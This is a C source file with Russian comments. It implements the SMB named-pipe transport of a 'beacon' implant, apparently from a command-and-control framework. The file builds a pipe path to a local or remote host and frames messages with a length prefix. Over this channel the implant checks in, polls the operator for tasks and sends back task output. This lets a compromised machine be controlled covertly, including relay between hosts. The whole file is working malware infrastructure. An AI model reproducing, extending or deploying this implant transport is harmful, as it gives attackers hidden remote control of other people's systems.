// SMB named-pipe transport. Connects to \\<host>\pipe\<name>.
// Тот же envelope, что и TCP: [u32 be len][u8 type][payload].
//
// host[] беакона хранит UNC-имя в формате  \\127.0.0.1\pipe\co2h
// или просто  .  для локального pipe (\\.\pipe\co2h).
// Имя пайпа берётся из uri_checkin (поле перепрофилировано для SMB).

#include "../../core/beacon.h"

static HANDLE g_pipe = INVALID_HANDLE_VALUE;

static void smb_close(void) {
    if (g_pipe != INVALID_HANDLE_VALUE) { CloseHandle(g_pipe); g_pipe = INVALID_HANDLE_VALUE; }
}

// Build pipe path: \\<host>\pipe\<name> where <name> = uri_checkin
// stripped of leading '/' (так "/co2h" → "co2h").
static int smb_build_path(wchar_t* out, size_t cap) {
    BeaconState* st = beacon_state();
    size_t i = 0;
    if (cap < 16) return -1;
    out[i++] = L'\\'; out[i++] = L'\\';
    const wchar_t* host = st->host;
    // Локальные адреса → точка: иначе WaitNamedPipeW идёт через SMB-редиректор
    // (порт 445) и падает с ERROR_BAD_NETPATH если SMB заблокирован.
    int is_local = (host[0] == 0)
        || (host[0]==L'1' && host[1]==L'2' && host[2]==L'7' && host[3]==L'.'
            && host[4]==L'0' && host[5]==L'.' && host[6]==L'0' && host[7]==L'.'
            && host[8]==L'1' && host[9]==0)
        || (host[0]==L'l' && host[1]==L'o' && host[2]==L'c' && host[3]==L'a'
            && host[4]==L'l' && host[5]==L'h' && host[6]==L'o' && host[7]==L's'
            && host[8]==L't' && host[9]==0);
    if (is_local) { out[i++] = L'.'; }
    else {
        for (size_t j = 0; host[j] && i + 1 < cap; ++j) out[i++] = host[j];
    }
    const wchar_t lit[] = L"\\pipe\\";
    for (size_t j = 0; j < 6 && i + 1 < cap; ++j) out[i++] = lit[j];
    const wchar_t* uri = st->uri_checkin;
    size_t k = 0;
    // "smb://name" → name
    if (uri[0]==L's' && uri[1]==L'm' && uri[2]==L'b' &&
        uri[3]==L':' && uri[4]==L'/' && uri[5]==L'/') { k = 6; }
    // "/name" → name
    else if (uri[0] == L'/') { k = 1; }
    int empty = 1;
    for (; uri[k] && i + 1 < cap; ++k) { out[i++] = uri[k]; empty = 0; }
    if (empty) {
        const wchar_t def[] = L"co2h";
        for (size_t j = 0; j < 4 && i + 1 < cap; ++j) out[i++] = def[j];
    }
    out[i] = 0;
    return 0;
}

static int smb_connect_if_needed(void) {
    if (g_pipe != INVALID_HANDLE_VALUE) return 0;
    wchar_t path[256];
    if (smb_build_path(path, 256) != 0) { bdbg("[smb] build_path failed\n"); return -1; }

    // Log path we're connecting to (convert wchar to char naively).
    {
        char dbuf[280]; int di = 0;
        const char pfx[] = "[smb] connecting to: ";
        for (size_t i = 0; pfx[i]; ++i) dbuf[di++] = pfx[i];
        for (int i = 0; path[i] && di < 270; ++i) dbuf[di++] = (char)path[i];
        dbuf[di++] = '\n'; dbuf[di] = 0;
        bdbg(dbuf);
    }

    if (!WaitNamedPipeW(path, 10000)) {
        char em[64];
        DWORD err = GetLastError();
        const char p[] = "[smb] WaitNamedPipe failed err=";
        int i = 0; for (; p[i]; ++i) em[i] = p[i];
        DWORD v = err; if (!v) em[i++]='0';
        else { char t[12]; int m=0; while(v){t[m++]=(char)('0'+v%10);v/=10;} while(m) em[i++]=t[--m]; }
        em[i++]='\n'; em[i]=0;
        bdbg(em);
        return -1;
    }

    HANDLE h = CreateFileW(path,
                           GENERIC_READ | GENERIC_WRITE, 0, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        char em[64];
        DWORD err = GetLastError();
        const char p[] = "[smb] CreateFileW failed err=";
        int i = 0; for (; p[i]; ++i) em[i] = p[i];
        DWORD v = err; if (!v) em[i++]='0';
        else { char t[12]; int m=0; while(v){t[m++]=(char)('0'+v%10);v/=10;} while(m) em[i++]=t[--m]; }
        em[i++]='\n'; em[i]=0;
        bdbg(em);
        return -1;
    }

    DWORD mode = PIPE_READMODE_BYTE;
    SetNamedPipeHandleState(h, &mode, NULL, NULL);
    g_pipe = h;
    bdbg("[smb] connected\n");
    return 0;
}

static int smb_write_all(const uint8_t* p, size_t n) {
    while (n) {
        DWORD w = 0;
        if (!WriteFile(g_pipe, p, (DWORD)n, &w, NULL) || w == 0) { smb_close(); return -1; }
        p += w; n -= w;
    }
    return 0;
}

static int smb_read_all(uint8_t* p, size_t n) {
    while (n) {
        DWORD r = 0;
        if (!ReadFile(g_pipe, p, (DWORD)n, &r, NULL) || r == 0) { smb_close(); return -1; }
        p += r; n -= r;
    }
    return 0;
}

static int smb_send_env(uint8_t type, const uint8_t* body, size_t body_len) {
    if (smb_connect_if_needed() != 0) return -1;
    uint32_t total = (uint32_t)(1 + body_len);
    uint8_t hdr[5];
    hdr[0] = (uint8_t)(total >> 24);
    hdr[1] = (uint8_t)(total >> 16);
    hdr[2] = (uint8_t)(total >>  8);
    hdr[3] = (uint8_t) total;
    hdr[4] = type;
    if (smb_write_all(hdr, 5) != 0) return -1;
    if (body_len && smb_write_all(body, body_len) != 0) return -1;
    return 0;
}

static int smb_recv_env(uint8_t* out_type, uint8_t* out, size_t* out_len) {
    uint8_t hdr[5];
    if (smb_read_all(hdr, 5) != 0) return -1;
    uint32_t total = ((uint32_t)hdr[0] << 24) | ((uint32_t)hdr[1] << 16)
                   | ((uint32_t)hdr[2] <<  8) |  (uint32_t)hdr[3];
    if (total < 1 || total > 16u * 1024u * 1024u) { smb_close(); return -1; }
    *out_type = hdr[4];
    size_t body = total - 1;
    if (body > *out_len) { smb_close(); return -1; }
    if (body && smb_read_all(out, body) != 0) return -1;
    *out_len = body;
    return 0;
}

static int smb_checkin(const uint8_t* frame, size_t flen,
                       uint8_t* out, size_t* out_len) {
    if (smb_send_env(TPORT_CHECKIN, frame, flen) != 0) { *out_len = 0; return -1; }
    uint8_t typ = 0;
    if (smb_recv_env(&typ, out, out_len) != 0) { *out_len = 0; return -1; }
    return (typ == TPORT_CHECKIN) ? 0 : -1;
}

static int smb_poll(uint8_t* out, size_t* out_len) {
    if (smb_send_env(TPORT_POLL, NULL, 0) != 0) { *out_len = 0; return -1; }
    uint8_t typ = 0;
    if (smb_recv_env(&typ, out, out_len) != 0) { *out_len = 0; return -1; }
    if (typ != TPORT_TASKS) { *out_len = 0; return 0; }
    return 0;
}

static int smb_submit(const uint8_t* frame, size_t flen) {
    if (smb_send_env(TPORT_OUTPUT, frame, flen) != 0) return -1;
    uint8_t scratch[16]; size_t slen = sizeof(scratch);
    uint8_t typ = 0;
    if (smb_recv_env(&typ, scratch, &slen) != 0) return -1;
    return (typ == TPORT_ACK) ? 0 : -1;
}

static int smb_connection_lost(void) { return g_pipe == INVALID_HANDLE_VALUE; }

const TransportVtbl g_transport_smb = {
    .checkin          = smb_checkin,
    .poll_tasks       = smb_poll,
    .submit_output    = smb_submit,
    .connection_lost  = smb_connection_lost,
};
